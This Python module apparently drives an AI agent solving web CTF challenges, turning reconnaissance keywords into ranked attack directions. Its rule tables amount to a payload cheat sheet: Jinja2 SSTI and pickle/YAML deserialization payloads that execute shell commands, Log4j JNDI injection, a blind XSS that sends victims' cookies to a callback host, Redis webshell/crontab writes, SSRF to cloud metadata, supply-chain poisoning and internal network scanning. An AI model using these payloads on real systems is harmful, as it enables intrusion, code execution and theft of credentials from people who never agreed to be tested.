"""攻击方向启发式推导 - 从 deepagents_agent.py 提取。

根据侦察发现中的关键词，自动推导可能的攻击方向。
按难度裁剪方向数量：easy最多3个，medium最多6个，hard不限。
新增：题目描述预分析，识别明显CTF模式。
"""

from __future__ import annotations

import re


_FRAMEWORK_RULES: list[tuple[list[str], str]] = [
    (["fastapi", "uvicorn", "openapi", "swagger"],
     "FastAPI/Swagger应用: 检查/openapi.json发现所有端点，对每个端点用python3搜索flag"),
    (["flask", "werkzeug", "jinja", "ssti", "{{7*7}}"],
     "SSTI (Jinja2模板注入): 用{{7*7}}检测→{{lipsum.__globals__['os'].popen('cat /flag').read()}} / {{cycler.__init__.__globals__.os.popen('cat /flag').read()}} / attr()过滤绕过"),
    (["php", "apache", "x-powered-by: php"],
     "PHP类型混淆/Magic Hash: password[]=, 240610708"),
    (["pydash", "原型链", "prototype", "merge", "set_", "__class__"],
     "PyDash原型链污染: POST JSON → {\"key\":\"__class__.__init__.__globals__\",\"value\":\"\"}, 逐步测试__spec__/os.popen/config.SECRET_KEY路径; 八进制编码绕过Cookie检查"),
    (["fastjson", "@type"],
     "Fastjson RCE: 用curl发送 @type payload"),
    (["shiro", "rememberme"],
     "Shiro反序列化: 检测 rememberMe=deleteMe 后尝试默认密钥"),
    (["log4j", "jndi"],
     "Log4j RCE: 在各HTTP头中注入 ${jndi:ldap://}"),
    (["struts", "ognl", ".action", ".do"],
     "Struts2 RCE: 在Content-Type中注入OGNL表达式"),
    (["thinkphp", "tp5", "invokefunction"],
     "ThinkPHP RCE: 测试 /index.php?s=/index/\\think\\app/invokefunction"),
    (["nacos", "8848"],
     "Nacos利用: 访问 /nacos/v1/auth/users 和 /nacos/v1/cs/configs"),
    (["spring", "actuator", "whitelabel"],
     "Spring漏洞: 检查/actuator/env + heapdump, Spring4Shell, SpEL注入"),
    (["pickle", "marshal", "base64", "deseriali", "反序列"],
     "Python反序列化: 生成pickle payload → class E: def __reduce__(self): return (eval,(\"__import__('os').popen('cat /flag').read()\",)); base64编码后发送到session/cookie/API参数"),
    (["yaml", "yml", "load("],
     "YAML反序列化: !!python/object/apply:os.system ['cat /flag'] 或 !!python/object/apply:subprocess.check_output"),
]

_FUNCTIONALITY_RULES: list[tuple[list[str], str]] = [
    (["500", "internal server error", "filtered", "waf", "blocked"],
     "WAF/过滤器绕过: 大小写混合(oR/aNd/UnIoN)、注释插入(/**/OR/**/)、URL编码(%0a)、双写(oorr)"),
    (["login", "登录", "username", "password", "认证", "auth"],
     "登录绕过: 默认凭据 → SQL注入(含WAF绕过:大小写混合) → 类型混淆 → JWT篡改"),
    (["upload", "上传", "file", "附件"],
     "文件上传: 尝试修改Content-Type/扩展名/Magic Bytes绕过检测"),
    (["图片", "image", "头像", "avatar", "resize"],
     "图片处理漏洞: 上传SVG测试XXE/SSRF, ImageTragick RCE"),
    (["报表", "导出", "export", "excel", "xlsx"],
     "报表导出漏洞: OOXML XXE(构造恶意xlsx中嵌入XXE实体读/flag), PDF生成器SSRF/LFI(file:///flag)"),
    (["sso", "cas", "统一认证", "单点", "oauth", "saml"],
     "SSO/认证绕过: CAS默认凭据casuser:Mellon, redirect_uri篡改"),
    (["秒杀", "优惠券", "抢购", "限时", "余额", "coupon"],
     "竞态条件: 用bash并发请求 for i in $(seq 1 20); do curl ... & done; wait"),
    (["helpdesk", "工单", "ticket", "support", "客服", "反馈"],
     "Blind XSS: 提交工单内容包含<script>fetch('http://CALLBACK_IP:9999/'+document.cookie)</script>，等待管理员触发; 如有Cookie则用cookie访问/admin读flag"),
    (["供应链", "supply", "投毒", "build", "pipeline", "构建", "registry", "镜像"],
     "供应链投毒: 检查构建/部署/镜像注册API→上传恶意包或注入构建脚本(cat /flag), 依赖混淆攻击(高版本覆盖)"),
    (["合同", "审批", "contract", "approval", "临时"],
     "业务逻辑漏洞: 关注'临时调整'等提示→参数篡改(status/approved/role), 越权访问其他用户合同, 检查时间窗口绕过"),
    (["诊断", "diagnostic", "日志", "logging", "系统面板", "monitor"],
     "诊断面板利用: 1)找硬编码密码(检查JS/配置文件/默认admin:admin) 2)日志注入→SQL注入(通过日志查询功能)"),
]

_VULN_CLASS_RULES: list[tuple[list[str], str]] = [
    (["only admin", "admin only", "权限不足", "forbidden", "not authorized", "access denied"],
     "权限绕过: 系统性尝试换参数名/换HTTP方法/换Content-Type/路径编码变体，每次用python3搜flag"),
    (["api", "/api/", "json", "rest"],
     "API未授权访问/IDOR: 遍历API端点，修改id参数，尝试不同HTTP方法和参数变体"),
    (["url=", "fetch", "ssrf", "proxy", "redirect", "webhook", "import", "probe"],
     "SSRF深度利用: Step1用curl测http://127.0.0.1/http://internal-api:5000/file:///flag; Step2 IP变体绕过(0x7f000001/[::1]/127.1); Step3 gopher打内网Redis; Step4 302跳转绕过白名单"),
    (["redis", "6379", "未授权"],
     "Redis利用: redis-cli连接后写webshell/SSH/crontab"),
    (["xml", "xxe", "docx", "xlsx"],
     "XXE深度利用: 基本实体读/flag → 参数实体OOB外带(需CALLBACK_IP) → CDATA绕过 → OOXML嵌入XXE(构造恶意docx/xlsx上传)"),
    (["deseriali", "反序列", "pickle", "marshal"],
     "Python反序列化: pickle payload生成(class E: __reduce__ return eval+popen) → base64编码发送; YAML: !!python/object/apply:os.system"),
    (["debug", "console", "werkzeug", "诊断"],
     "Debug控制台: 尝试 /console, Werkzeug PIN 计算"),
    (["jwt", "token", "bearer"],
     "JWT伪造: alg:none / 弱密钥爆破 / RS256→HS256"),
    (["用友", "致远", "泛微", "通达", "oa"],
     "国产OA: 检查BshServlet/htmlofficeservlet/ajax.do等已知入口"),
    (["weblogic", "7001", "t3"],
     "WebLogic: CVE-2020-14882 URL编码绕过Console认证直接RCE"),
    (["confluence", "atlassian"],
     "Confluence: CVE-2022-26134 URL中OGNL注入(无需认证前台RCE)"),
    (["tomcat", "ajp", "8009", "manager"],
     "Tomcat: Ghostcat(AJP 8009端口)读WEB-INF/web.xml + Manager弱口令"),
    (["cloud", "169.254", "metadata", "元数据"],
     "云元数据: curl http://169.254.169.254/latest/meta-data/"),
    (["xxl-job", "xxljob", "任务调度"],
     "XXL-JOB: executor端口9999, 默认accessToken=default_token"),
    (["内网", "172.", "192.168", "10.", "内部", "internal", "asset", "资产探测"],
     "内网渗透: python3批量扫描(for ip in range(1,255): requests.get(f'http://10.0.0.{ip}:PORT',timeout=2)); 发现服务后测试未授权API/Redis/MySQL; SSRF作为跳板访问内网; 常见内网服务端口:22/80/443/3306/6379/8080/8443/9200"),
    (["graphql", "query", "mutation", "introspection"],
     "GraphQL枚举: POST {\"query\":\"{__schema{types{name fields{name}}}}\"}获取全部类型/字段 → 查询flag字段 → mutation修改权限"),
    (["货运", "物流", "tracking", "trace", "追踪"],
     "SSRF/API利用: 检查import/proxy/fetch类API → 用SSRF访问admin-api:5000 → 遍历内网端点(http://internal:PORT/flag)"),
]

_DEFAULT_DIRECTIONS_EASY = [
    "尝试直接 curl /flag, /flag.txt, /api/flag 等常见路径",
    "检查默认凭据 admin:admin, admin:123456 等",
    "用curl逐个测试输入点: SQL注入(' OR 1=1--) / 命令注入(;id) / SSTI({{7*7}})",
]

_DEFAULT_DIRECTIONS = [
    "用curl逐个测试输入点: SQL注入/命令注入/SSTI/LFI/SSRF",
    "检查默认凭据和弱口令",
    "用 search_poc_kb 查找对应技术栈漏洞",
]

_DIFFICULTY_MAX_DIRECTIONS = {"easy": 3, "medium": 6, "hard": 99}


def analyze_challenge_description(description: str, title: str) -> list[str]:
    """从题目描述和标题中提取攻击提示。返回提示列表。"""
    hints: list[str] = []
    desc = description.strip()
    combined = f"{title} {desc}".lower()

    if re.match(r'^[0-9a-f]{32}$', desc):
        hints.append("★题目描述是MD5哈希 → PHP Magic Hash(0e碰撞/类型混淆)，优先尝试 password=240610708 或 password[]=")
    elif re.match(r'^[0-9a-f]{40}$', desc):
        hints.append("★题目描述是SHA1哈希 → 尝试SHA1 magic hash: aaroZmOk / aabg7XSs")
    elif 'flag{' in desc:
        hints.append("★题目描述中直接包含flag格式，可能是提示或测试题")

    kw_hints = {
        'sql': '可能涉及SQL注入', 'upload': '可能涉及文件上传',
        'ssti': '可能涉及模板注入(Jinja2: {{lipsum.__globals__["os"].popen("cat /flag").read()}})',
        'jwt': '可能涉及JWT伪造', 'pickle': '可能涉及Python反序列化(pickle RCE)',
        'ssrf': '可能涉及SSRF(测试file:///flag + 内网http://127.0.0.1)',
        'xxe': '可能涉及XXE(构造实体读/flag, 参数实体OOB外带)',
        'xss': '可能涉及XSS(Blind XSS需回连收Cookie)',
        'rce': '可能涉及远程代码执行', 'lfi': '可能涉及文件包含',
        'deserialization': '可能涉及反序列化', '反序列化': '可能涉及反序列化',
        'race': '可能涉及竞态条件', '条件竞争': '可能涉及竞态条件',
        'prototype': '可能涉及原型链污染', 'pydash': '可能涉及PyDash原型链污染(__class__.__init__.__globals__路径)',
        '内网': '涉及内网渗透(批量扫描存活IP, SSRF跳板, 未授权服务)',
        '资产': '涉及资产探测(扫描内网IP段/端口, 发现隐藏服务)',
        '供应链': '涉及供应链攻击(依赖混淆/构建注入/镜像替换)',
        '投毒': '涉及供应链投毒(检查build/deploy/registry API)',
        'graphql': '涉及GraphQL(introspection枚举所有类型和字段)',
        '报表': '涉及报表导出漏洞(OOXML XXE / PDF SSRF)',
        '导出': '涉及导出功能漏洞(XXE/SSRF/LFI)',
        '货运': '涉及SSRF/API利用(import/proxy功能访问内网)',
        '追踪': '涉及SSRF(检查是否有proxy/fetch/import类API)',
        '工单': '涉及Blind XSS(提交含JS的工单等管理员触发)',
        'helpdesk': '涉及Blind XSS(提交含JS的工单等管理员触发)',
    }
    for kw, hint in kw_hints.items():
        if kw in combined:
            hints.append(f"★{hint}（题目中出现关键词'{kw}'）")

    return hints


def derive_attack_directions(
    findings: str,
    difficulty: str = "medium",
    *,
    description: str = "",
    title: str = "",
) -> str:
    """根据侦察发现启发式推导攻击方向。按难度裁剪数量。"""
    fl = findings.lower()
    directions: list[str] = []
    idx = 0

    desc_hints = analyze_challenge_description(description, title)
    for hint in desc_hints:
        idx += 1
        directions.append(f"{idx}. {hint}")

    for rules in (_FRAMEWORK_RULES, _FUNCTIONALITY_RULES, _VULN_CLASS_RULES):
        for keywords, direction in rules:
            if any(kw in fl for kw in keywords):
                idx += 1
                directions.append(f"{idx}. {direction}")

    if not directions:
        defaults = _DEFAULT_DIRECTIONS_EASY if difficulty == "easy" else _DEFAULT_DIRECTIONS
        directions = [f"{i+1}. {d}" for i, d in enumerate(defaults)]

    max_dirs = _DIFFICULTY_MAX_DIRECTIONS.get(difficulty, 6)
    directions = directions[:max_dirs]

    if difficulty == "easy" and len(directions) > 0:
        directions.append("★ EASY题原则: 先试最简单的方法(直接访问/默认凭据/一句话payload)，2次无效就换方向，不要搞复杂攻击链")

    if difficulty == "hard" and len(directions) < 3:
        directions.append("★ 组合攻击: 尝试信息泄露获取凭据 + 认证后利用")
        directions.append("★ 使用 view_current_hint 获取提示（如有必要）")

    return "\n".join(directions)
